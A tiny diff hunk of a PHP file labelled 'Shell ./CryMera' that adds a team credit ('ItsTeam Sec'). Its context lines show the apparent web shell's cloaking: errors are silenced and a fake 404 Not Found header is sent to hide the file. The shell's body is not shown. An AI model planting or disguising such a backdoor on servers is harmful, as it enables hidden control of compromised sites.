@@ -1,6 +1,6 @@
 <?php 
 // Shell ./CryMera
-// Team = 
+// Team = ItsTeam Sec
 
 error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
